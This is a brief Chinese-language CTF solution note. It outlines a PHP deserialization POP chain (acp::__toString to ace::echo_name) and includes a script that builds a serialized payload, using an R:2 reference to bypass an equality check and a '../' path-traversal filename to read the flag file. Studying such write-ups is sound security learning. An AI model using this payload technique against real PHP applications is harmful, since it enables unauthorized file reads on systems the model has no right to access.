- # 思路
	- pop
	- 利用指针将nova指向neutron即可
		- ((6478aaed-0cfc-41e3-a12e-55de79af3104))
	- ```
	  acp:: __toString
	  ace:: echo_name
	  	acp -->
	  	if($this->openstack->neutron === $this->openstack->nova)
	  ```
	- ```php
	  $payload = "../../../../../../nssctfasdasdflag";
	  $o3 = new acp();
	  $o3 -> neutron = "";
	  $o3 -> nova = "novaishere";
	  $ser_o3 = serialize($o3);
	  $ser_o3 = str_replace('s:10:"novaishere"', 'R:2;', $ser_o3);
	  $o2 = new ace();
	  $o2 -> docker = $ser_o3;
	  $o2 -> filename = $payload;
	  $o1 = new acp();
	  $o1 -> setcinder($o2);
	  $ser = serialize($o1);
	  var_dump($ser);
	  echo "<br>";
	  echo urlencode($ser);
	  ```